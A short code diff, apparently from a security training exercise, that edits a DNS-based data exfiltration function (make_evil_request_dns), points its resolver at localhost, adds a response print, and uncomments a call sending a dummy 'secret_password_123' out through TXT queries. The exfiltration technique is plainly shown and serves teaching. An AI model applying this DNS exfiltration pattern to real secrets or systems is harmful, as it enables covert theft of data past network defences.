@@ -218,7 +218,7 @@ exfiltrate_data = make_evil_request_ftp
 import dns.resolver as dns_resolver  # Alias to avoid conflict with mitmproxy.dns
 
 resolver = dns_resolver.Resolver()
-resolver.nameservers = ["127.0.0.2", "8.8.8.8", "1.1.1.1"]
+resolver.nameservers = ["127.0.0.1", "8.8.8.8", "1.1.1.1"]
 
 
 def make_evil_request_dns(secret_data: str) -> Optional[str]:
@@ -242,6 +242,7 @@ def make_evil_request_dns(secret_data: str) -> Optional[str]:
         result = resolver.resolve(domain, "TXT")
         #   3. Return the first TXT record found, or None if no records are found
         if result.response:
+            print("response: ", result.response.to_text())
             return result.response.to_text()
         return None
     except Exception as e:
@@ -249,7 +250,7 @@ def make_evil_request_dns(secret_data: str) -> Optional[str]:
         return None
 
 
-# result = make_evil_request_dns("secret_password_123")
+result = make_evil_request_dns("secret_password_123")
 
 # from w1d2_test import test_make_evil_request_dns
 # test_make_evil_request_dns(make_evil_request_dns, resolver)
